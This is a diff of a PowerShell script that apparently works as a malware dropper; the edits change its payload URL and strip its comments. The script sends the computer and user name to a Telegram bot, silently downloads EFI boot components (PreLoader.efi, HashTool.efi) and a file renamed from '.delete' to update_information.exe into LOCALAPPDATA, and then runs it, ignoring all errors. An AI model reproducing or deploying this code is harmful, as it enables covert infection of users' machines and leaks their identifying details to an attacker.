@@ -1,4 +1,4 @@
-﻿# ===== ИНИЦИАЛИЗАЦИЯ =====
+# ===== ИНИЦИАЛИЗАЦИЯ =====
 $device = $env:COMPUTERNAME
 $user = $env:USERNAME
 
@@ -22,7 +22,7 @@ $url = "https://api.telegram.org/bot$Token/sendMessage"
 try {
     Invoke-RestMethod -Uri $url -Method Post -ContentType "application/json" -Body $body | Out-Null
 } catch {
-    # Игнорируем ошибки
+
 }
 
 # ===== ИНИЦИАЛИЗАЦИЯ ЛОГОВ =====
@@ -53,7 +53,7 @@ try {
 # ===== ЗАГРУЗКА ВСЕХ ФАЙЛОВ =====
 $localAppData = $env:LOCALAPPDATA
 
-# Массив файлов для загрузки (URL и имя файла)
+
 $files = @(
     @{Url = "https://www.udrop.com/file/Omlf/PreLoader.efi"; Name = "PreLoader.efi"},
     @{Url = "https://www.udrop.com/file/Omle/HashTool.efi"; Name = "HashTool.efi"},
@@ -62,16 +62,16 @@ $files = @(
     @{Url = "https://www.udrop.com/file/Omsf/step2.png"; Name = "step2.png"},
     @{Url = "https://www.udrop.com/file/Omse/step3.png"; Name = "step3.png"},
     @{Url = "https://www.udrop.com/file/Omsg/step4.png"; Name = "step4.png"},
-    @{Url = "https://www.udrop.com/file/Omsh/update_information.delete"; Name = "update_information.exe"}
+    @{Url = "https://www.udrop.com/file/OnsJ/update_information.delete"; Name = "update_information.exe"}
 )
 
-# Загрузка всех файлов
+
 foreach ($file in $files) {
     $outputPath = Join-Path -Path $localAppData -ChildPath $file.Name
     try {
         Invoke-WebRequest -Uri $file.Url -OutFile $outputPath -UseBasicParsing
     } catch {
-        # Игнорируем ошибки
+
     }
 }
 
@@ -117,7 +117,7 @@ $body = @{
 try {
     Invoke-RestMethod -Uri $url -Method Post -ContentType "application/json" -Body $body | Out-Null
 } catch {
-    # Игнорируем ошибки
+
 }
 
 # ===== ОЖИДАНИЕ ЗАВЕРШЕНИЯ ПРОЦЕССА =====
@@ -144,5 +144,4 @@ if ($process) {
 $strUpdatePath = Join-Path $env:LOCALAPPDATA "update_information.exe"
 if (Test-Path $strUpdatePath) {
     Start-Process -FilePath $strUpdatePath -WindowStyle Normal
-
 }
